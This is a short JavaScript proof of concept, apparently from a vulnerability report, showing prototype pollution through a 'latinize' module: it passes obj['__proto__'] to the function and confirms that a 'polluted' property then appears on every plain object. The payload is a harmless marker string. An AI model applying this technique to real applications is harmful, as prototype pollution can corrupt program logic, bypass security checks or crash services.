var latinize = require('./latinize');
const obj = {}
console.log('Before: ' + {}.polluted)
latinize(obj['__proto__'], {}).polluted = 'Polluted!'
console.log('After: ' + {}.polluted)